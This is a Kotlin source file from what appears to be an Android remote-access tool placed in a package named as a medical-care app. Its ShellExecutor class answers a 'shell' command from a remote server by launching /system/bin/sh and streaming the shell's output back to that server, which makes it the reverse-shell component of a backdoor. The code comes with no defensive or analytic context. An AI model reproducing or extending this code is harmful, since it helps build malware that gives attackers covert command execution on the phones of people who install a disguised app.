package com.example.medicalcare.features.network.commands

import android.util.Log
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStreamReader

class ShellExecutor : CommandHandler {
    override fun handle(command: String, toServer: DataOutputStream) {
        if (command.equals("shell", ignoreCase = true)) {
            try {
                val process = ProcessBuilder("/system/bin/sh").redirectErrorStream(true).start()
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                val writer = DataOutputStream(process.outputStream)

                toServer.write("----------Starting Shell----------\n".toByteArray())
                toServer.flush()

                // Thread to continuously read shell output
                Thread {
                    try {
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            toServer.write((line + "\n").toByteArray())
                            toServer.flush()
                        }
                    } catch (e: Exception) {
                        Log.e("ShellExecutor", "Error reading shell output", e)
                    }
                }.start()

            } catch (e: Exception) {
                Log.e("ShellExecutor", "Failed to start shell", e)
                toServer.write("[!] Failed to start shell\n".toByteArray())
                toServer.flush()
            }
        }
    }
}